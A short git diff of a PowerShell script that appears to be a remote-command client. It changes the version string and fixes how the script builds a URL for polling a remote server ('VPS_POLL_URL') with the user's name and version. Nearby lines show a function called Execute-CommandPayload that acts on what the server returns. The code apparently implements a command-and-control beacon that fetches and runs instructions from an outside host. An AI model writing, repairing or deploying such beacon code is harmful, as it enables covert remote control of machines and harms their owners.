@@ -27,7 +27,7 @@ else {
 }
 
 $uniqueUser = "$($env:USERNAME)-$uniqueId-W"
-$SCRIPT_VERSION = "9d5cb11"
+$SCRIPT_VERSION = "867fddf"
 $clientVersion = $SCRIPT_VERSION
 
 function Execute-CommandPayload ($r) {
@@ -74,7 +74,7 @@ try {
     try {
       $safeUser = [System.Uri]::EscapeDataString([string]$uniqueUser)
       $safeVer = [System.Uri]::EscapeDataString([string]$clientVersion)
-      $pollUrl = "$VPS_POLL_URL?username=$safeUser&version=$safeVer"
+      $pollUrl = $VPS_POLL_URL + "?username=" + $safeUser + "&version=" + $safeVer
       
       $r = Invoke-RestMethod -Method Get -Uri $pollUrl -TimeoutSec 10 -UseBasicParsing
       if ($r) {
